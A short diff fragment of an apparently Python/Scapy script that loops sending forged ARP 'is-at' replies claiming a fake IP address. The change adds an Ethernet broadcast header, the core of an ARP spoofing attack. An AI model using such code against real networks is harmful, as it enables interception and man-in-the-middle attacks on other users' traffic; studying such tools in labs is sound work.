@@ -19,6 +19,7 @@ fakeIp=args.fakeIp
 
 while True:
     send(
+        Ether(dst="ff:ff:ff:ff:ff:ff") /
         ARP(
             op="is-at",
             psrc=fakeIp, 
